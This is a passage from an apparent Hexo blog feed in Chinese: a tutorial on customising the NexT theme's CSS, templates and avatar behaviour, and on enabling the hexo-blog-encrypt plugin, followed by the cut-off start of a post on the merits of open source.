&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;</span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span>{</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover {</span><br><span class="line">    <span class="selector-tag">color</span>: <span class="selector-id">#fc6423</span>;</span><br><span class="line">    <span class="selector-tag">border-bottom</span>: <span class="selector-tag">none</span>;</span><br><span class="line">    <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#fc6423</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="2-3-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;-&#x53F7;"><a href="#2-3-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;-&#x53F7;" class="headerlink" title="2.3 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;#&#x53F7;"></a>2.3 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;#&#x53F7;</h5><blockquote><p><code>/themes/next/layout/_macro/post.swig</code></p><p>&#x641C;&#x7D22;<code>rel=&quot;tag&quot;</code>&#xFF0C;&#x5C06;#&#x6362;&#x6210;<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p></blockquote><h5 id="2-4-&#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;"><a href="#2-4-&#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;" class="headerlink" title="2.4 &#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;"></a>2.4 &#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;</h5><blockquote><p>&#x5728;<code>\themes\next\layout\_macro</code>&#x4E2D;&#x65B0;&#x5EFA;<code>passage-end-tag.swig&#x6587;&#x4EF6;</code></p></blockquote><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    {% if not is_index %}</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;color: #ccc;font-size:14px;&quot;</span>&gt;</span>-------------Ending-------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    {% endif %}</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>&#x63A5;&#x7740;&#x6253;&#x5F00;<code>\themes\next\layout\_macro\post.swig</code>&#xFF0C;&#x5728;<code>post-body</code>&#x4E4B;&#x540E;&#x548C;<code>post-footer</code>&#x4E4B;&#x524D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  {% if not is_index %}</span><br><span class="line">    {% include &apos;post-end-tag.swig&apos; %}</span><br><span class="line">  {% endif %}</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>&#x7136;&#x540E;&#x5728;<code>&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</code>&#x672B;&#x5C3E;&#x6DFB;&#x52A0;</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x672C;&#x6587;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></tbody></table></figure><h5 id="2-5-&#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;"><a href="#2-5-&#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;" class="headerlink" title="2.5 &#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;"></a>2.5 &#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;</h5><p>&#x6253;&#x5F00;<code>\themes\next\source\css\_common\components\sidebar\sidebar-author.styl</code></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.site-author-image</span> {</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">padding</span>: $site-author-image-padding;</span><br><span class="line">  <span class="attribute">max-width</span>: $site-author-image-width;</span><br><span class="line">  <span class="attribute">height</span>: $site-author-image-height;</span><br><span class="line">  <span class="attribute">border</span>: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line">  <span class="comment">/* &#x5934;&#x50CF;&#x5706;&#x5F62; */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">-webkit-border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">-moz-border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: inset <span class="number">0</span> -<span class="number">1px</span> <span class="number">0</span> <span class="number">#333</span>sf;</span><br><span class="line">  <span class="comment">/* &#x8BBE;&#x7F6E;&#x5FAA;&#x73AF;&#x52A8;&#x753B; [animation: (play)&#x52A8;&#x753B;&#x540D;&#x79F0; (2s)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x65F6;&#x957F;&#x5355;&#x4F4D;&#x79D2;&#x6216;&#x5FAE;&#x79D2; (ase-out)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x7684;&#x901F;&#x5EA6;&#x66F2;&#x7EBF;&#x4E3A;&#x4EE5;&#x4F4E;&#x901F;&#x7ED3;&#x675F; </span></span><br><span class="line"><span class="comment">    (1s)&#x7B49;&#x5F85;1&#x79D2;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x52A8;&#x753B; (1)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x6B21;&#x6570;(infinite&#x4E3A;&#x5FAA;&#x73AF;&#x64AD;&#x653E;) ]*/</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */</span></span><br><span class="line">  <span class="attribute">-webkit-transition</span>: -webkit-transform <span class="number">1.0s</span> ease-out;</span><br><span class="line">  <span class="attribute">-moz-transition</span>: -moz-transform <span class="number">1.0s</span> ease-out;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">1.0s</span> ease-out;</span><br><span class="line">}</span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> {</span><br><span class="line">  <span class="comment">/* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x505C;&#x6B62;&#x5934;&#x50CF;&#x65CB;&#x8F6C; </span></span><br><span class="line"><span class="comment">  -webkit-animation-play-state:paused;</span></span><br><span class="line"><span class="comment">  animation-play-state:paused;*/</span></span><br><span class="line">  <span class="comment">/* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(360deg);</span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(360deg);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(360deg);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* Z &#x8F74;&#x65CB;&#x8F6C;&#x52A8;&#x753B; */</span></span><br><span class="line">@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> play {</span><br><span class="line">  0% {</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(0deg);</span><br><span class="line">  }</span><br><span class="line">  100% {</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateZ</span>(-360deg);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">@-<span class="keyword">moz</span>-<span class="keyword">keyframes</span> play {</span><br><span class="line">  0% {</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(0deg);</span><br><span class="line">  }</span><br><span class="line">  100% {</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotateZ</span>(-360deg);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">@<span class="keyword">keyframes</span> play {</span><br><span class="line">  0% {</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(0deg);</span><br><span class="line">  }</span><br><span class="line">  100% {</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(-360deg);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="2-6-&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;"><a href="#2-6-&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;" class="headerlink" title="2.6 &#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;"></a>2.6 &#x4FEE;&#x6539;<code></code>&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;</h5><p><code>\themes\next\source\css\_custom\custom.styl</code></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x5411;&#x91CC;&#x9762;&#x52A0;&#x5165;&#xFF1A;(&#x989C;&#x8272;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x5B9A;&#x4E49;)</span><br><span class="line">// Custom styles.</span><br><span class="line"><span class="selector-tag">code</span> {</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ff7600</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fbf7f8</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">2px</span>;</span><br><span class="line">}</span><br><span class="line">// &#x5927;&#x4EE3;&#x7801;&#x5757;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x6837;&#x5F0F;</span><br><span class="line"><span class="selector-class">.highlight</span>, <span class="selector-tag">pre</span> {</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.highlight</span>, <span class="selector-tag">code</span>, <span class="selector-tag">pre</span> {</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d6d6d6</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="2-7-&#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;"><a href="#2-7-&#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;" class="headerlink" title="2.7 &#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;"></a>2.7 &#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;</h5><p>&#x6253;&#x5F00;&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5C06;<code>number:</code>&#x53D8;&#x91CF;&#x6539;&#x6210;false&#x5373;&#x53EF;</p><pre><code>number: false</code></pre><h5 id="2-8-&#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;-amp-&#x989C;&#x8272;"><a href="#2-8-&#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;-amp-&#x989C;&#x8272;" class="headerlink" title="2.8 &#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;&amp;&#x989C;&#x8272;"></a>2.8 &#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;&amp;&#x989C;&#x8272;</h5><p>&#x4FA7;&#x8FB9;&#x680F;&#x6837;&#x5F0F;&#x6587;&#x4EF6;<code>\themes\next\source\css\_common\components\sidebar\sidebar.styl</code></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.sidebar</span> {</span><br><span class="line"><span class="attribute">position</span>: fixed;</span><br><span class="line"><span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(&#x56FE;&#x7247;&#x5730;&#x5740;.jpg) no-repeat <span class="meta">!important</span>;</span><br><span class="line"><span class="attribute">background-size</span>: cover <span class="meta">!important</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="2-9-&#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;"><a href="#2-9-&#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;" class="headerlink" title="2.9 &#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;"></a>2.9 &#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;</h5><p>&#x6253;&#x5F00;<code>\next\source\css\_common\components\sidebar\sidebar-author.styl</code>&#xFF1B;<br>&#x5728;<code>.site-author-image</code>&#x53D8;&#x91CF;&#x5185;&#x6DFB;&#x52A0;<code>cursor: pointer;</code>&#x4FEE;&#x6539;&#x9F20;&#x6807;&#x6837;&#x5F0F;&#xFF1B;<br>&#x6253;&#x5F00;<code>\next\source\js\src\motion.js</code>&#xFF0C;&#x5728;&#x9876;&#x90E8;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&apos;.site-author-image&apos;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">     <span class="built_in">window</span>.location.href=<span class="string">&quot;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;&#x63A5;&quot;</span>;</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h3 id="3-0-&#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;"><a href="#3-0-&#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;" class="headerlink" title="3.0 &#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;"></a>3.0 &#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;</h3><blockquote><p>Hexo&#x7684;&#x6587;&#x7AE0;&#x52A0;&#x5BC6;&#x6211;&#x77E5;&#x9053;&#x7684;&#x6709;&#x4E24;&#x79CD;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x8BB2;<code>hexo-blog-encrypt</code> &#x7684;&#x4F7F;&#x7528;<br>&#x4F60;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x51FA;&#x4E8E;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x592A;&#x5E0C;&#x671B;&#x6BCF;&#x4E00;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x3002;<br>&#x6240;&#x4EE5;&#x4F60;&#x5E38;&#x5E38;&#x4F1A;&#x4E3A;&#x8FD9;&#x79CD;&#x6587;&#x7AE0;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x624D;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x3002;<br>&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x53C2;&#x8003;&#xFF1A;<a href="https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md" target="_blank" rel="noopener">https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md</a></p></blockquote><h5 id="3-1-&#x5B89;&#x88C5;"><a href="#3-1-&#x5B89;&#x88C5;" class="headerlink" title="3.1 &#x5B89;&#x88C5;"></a>3.1 &#x5B89;&#x88C5;</h5><ul><li>&#x5728;hexo&#x6839;&#x76EE;&#x5F55;&#x7684;<code>package.json</code>&#x6587;&#x4EF6;&#x4E2D;&#x7684;<code>dependencies</code>&#x6DFB;&#x52A0;<code>&quot;hexo-blog-encrypt&quot;: &quot;1.1.*&quot;,</code></li><li><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x5C3D;&#x91CF;&#x6DFB;&#x52A0;&#x5728;&#x5F00;&#x5934;&#xFF0C;&#x4E0D;&#x8981;&#x52A0;&#x5728;&#x5E95;&#x90E8;</li><li>&#x7136;&#x540E;&#x6267;&#x884C;<code>npm install</code>&#x547D;&#x4EE4;</li><li>&#x8BE5;&#x63D2;&#x4EF6;&#x4F1A;&#x81EA;&#x52A8;&#x5B89;&#x88C5;</li></ul><h5 id="3-2-&#x5FEB;&#x901F;&#x5F00;&#x59CB;"><a href="#3-2-&#x5FEB;&#x901F;&#x5F00;&#x59CB;" class="headerlink" title="3.2 &#x5FEB;&#x901F;&#x5F00;&#x59CB;"></a>3.2 &#x5FEB;&#x901F;&#x5F00;&#x59CB;</h5><ul><li>&#x9996;&#x5148;&#x5728;<code>_config.yml</code>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x542F;&#x7528;&#x63D2;&#x4EF6;</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Security</span><br><span class="line">##</span><br><span class="line">encrypt:</span><br><span class="line">  enable: true</span><br></pre></td></tr></tbody></table></figure><ul><li>&#x7136;&#x540E;&#x5728;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x7684;&#x5934;&#x90E8;&#x4E0A;&#x52A0;&#x4E0A;&#x5BF9;&#x5E94;&#x5B57;&#x6BB5;&#xFF1A;</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hello world</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">tags:</span><br><span class="line">  - fdsafsdaf</span><br><span class="line">password: 123456</span><br><span class="line">abstract: Welcome to my blog, enter password to read.</span><br><span class="line">message: Welcome to my blog, enter password to read.</span><br><span class="line">---</span><br></pre></td></tr></tbody></table></figure><ul><li>password: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x52A0;&#x5BC6;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;</li><li>abstract: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x7684;&#x6458;&#x8981;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x5728;&#x535A;&#x5BA2;&#x7684;&#x5217;&#x8868;&#x9875;</li><li>message: &#x8FD9;&#x4E2A;&#x662F;&#x535A;&#x5BA2;&#x67E5;&#x770B;&#x65F6;&#xFF0C;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x6846;&#x4E0A;&#x9762;&#x7684;&#x63CF;&#x8FF0;&#x6027;&#x6587;&#x5B57;</li></ul><h3 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h3><p><strong>&#x7ED9;&#x51FA;&#x4E00;&#x4E9B;&#x6574;&#x7406;&#x7684;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x6587;&#x7AE0;</strong><br><a href="http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/" target="_blank" rel="noopener">&#x4E3A;Hexo NexT&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x54C8;&#x6797;&#x6447;&#x7279;&#x6548;</a><br><a href="http://shenzekun.cn/h-exo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">hexo&#x7684;next&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x6559;&#x7A0B;&#xFF1A;&#x6253;&#x9020;&#x70AB;&#x9177;&#x7F51;&#x7AD9;| Moorez</a><br><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">&#x6253;&#x9020;&#x4E2A;&#x6027;&#x8D85;&#x8D5E;&#x535A;&#x5BA2;Hexo+NexT+GitHubPages</a><br><a href="http://mashirosorata.vicp.io/HEXO-NEXT%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE.html" target="_blank" rel="noopener">HEXO+NEXT&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x914D;&#x7F6E;| SORA</a><br><code>&#x5B98;&#x65B9;</code><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT &#x4F7F;&#x7528;&#x6587;&#x6863;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      Hexo和NexT主题
    
    </summary>
    
      <category term="前端" scheme="https://marnm.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Hexo" scheme="https://marnm.github.io/tags/Hexo/"/>
    
      <category term="NexT" scheme="https://marnm.github.io/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>Linux学习笔记 - 关于开源</title>
    <link href="https://marnm.github.io//posts/67ee4dec/"/>
    <id>https://marnm.github.io//posts/67ee4dec/</id>
    <published>2018-07-10T12:55:02.000Z</published>
    <updated>2020-04-09T11:50:11.075Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-&#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;"><a href="#1-&#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;" class="headerlink" title="1. &#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;"></a>1. &#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;</h3><p><strong>&#x4F4E;&#x98CE;&#x9669;&#xFF1A;</strong>&#x4F7F;&#x7528;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x65E0;&#x7591;&#x628A;&#x547D;&#x8FD0;&#x4EA4;&#x4ED8;&#x7ED9;&#x4ED6;&#x4EBA;&#xFF0C;&#x4E00;&#x65E6;&#x5C01;&#x95ED;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x4EBA;&#x6765;&#x7EF4;&#x62A4;&#xFF0C;&#x4F60;&#x5C06;&#x8FDB;&#x9000;&#x7EF4;&#x8C37;&#xFF1B;&#x800C;&#x4E14;&#x76F8;&#x8F83;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x516C;&#x53F8;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x5F88;&#x5C11;&#x5B58;&#x5728;&#x5012;&#x95ED;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p><strong>&#x9AD8;&#x54C1;&#x8D28;&#xFF1A;</strong>&#x76F8;&#x8F83;&#x4E8E;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x4EA7;&#x54C1;&#xFF0C;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x901A;&#x5E38;&#x662F;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6765;&#x7814;&#x53D1;&#x53CA;&#x7EF4;&#x62A4;&#x7684;&#xFF0C;&#x53C2;&#x4E0E;&#x7F16;&#x5199;&#x3001;&#x7EF4;&#x62A4;&#x3001;&#x6D4B;&#x8BD5;&#x7684;&#x7528;&#x6237;&#x91CF;&#x4F17;&#x591A;&#xFF0C;&#x4E00;&#x822C;&#x7684;bug&#x8FD8;&#x6CA1;&#x6709;&#x7B49;&#x7206;&#x53D1;&#x5C31;&#x5DF2;&#x7ECF;&#x88AB;&#x4FEE;&#x8865;&#x3002;</p><p><strong>&#x4F4E;&#x6210;&#x672C;&#xFF1A;</strong>&#x5F00;&#x6E90;&#x5DE5;&